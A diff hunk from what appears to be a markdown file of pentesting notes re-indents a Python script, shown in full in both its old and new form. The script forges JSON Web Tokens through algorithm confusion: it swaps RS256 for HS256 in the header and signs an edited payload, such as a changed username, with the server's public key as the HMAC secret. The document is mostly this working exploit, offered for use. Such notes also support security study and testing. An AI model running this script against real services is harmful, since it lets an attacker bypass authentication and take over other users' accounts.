@@ -503,32 +503,32 @@ Once you have the public key in a suitable format, you can [modify the JWT](htt
 - simple script
     
     ```python
-import hmac
-import base64
-import hashlib
-from sys import argv
-
-if len(argv) != 3:
-    print(f'Usage: {argv[0]} <Tampered JWT> <public_key_file>')
-    exit(1)
-
-tampered_token = argv[1]
-with open(argv[2], 'r') as file:
-    public_key = file.read()
-    
-
-print('you should edit the payload to your needs, e.g. change the username')
-
-header, payload, _ = tampered_token.split('.')
-
-# decode the header
-dec_header = base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode('utf-8').replace('RS256', 'HS256')
-enc_header = base64.urlsafe_b64encode(bytes(dec_header, 'utf-8')).decode('utf-8').replace('=', '')
-
-
-signature = base64.urlsafe_b64encode(hmac.new(bytes(public_key, 'utf-8'), bytes(f'{enc_header}.{payload}', 'utf-8'), hashlib.sha256).digest()).decode('utf-8').replace('=', '')
-
-print(f'{enc_header}.{payload}.{signature}')
+  import hmac
+  import base64
+  import hashlib
+  from sys import argv
+  
+  if len(argv) != 3:
+      print(f'Usage: {argv[0]} <Tampered JWT> <public_key_file>')
+      exit(1)
+  
+  tampered_token = argv[1]
+  with open(argv[2], 'r') as file:
+      public_key = file.read()
+      
+  
+  print('you should edit the payload to your needs, e.g. change the username')
+  
+  header, payload, _ = tampered_token.split('.')
+  
+  # decode the header
+  dec_header = base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode('utf-8').replace('RS256', 'HS256')
+  enc_header = base64.urlsafe_b64encode(bytes(dec_header, 'utf-8')).decode('utf-8').replace('=', '')
+  
+  
+  signature = base64.urlsafe_b64encode(hmac.new(bytes(public_key, 'utf-8'), bytes(f'{enc_header}.{payload}', 'utf-8'), hashlib.sha256).digest()).decode('utf-8').replace('=', '')
+  
+  print(f'{enc_header}.{payload}.{signature}')
 
     ```
     
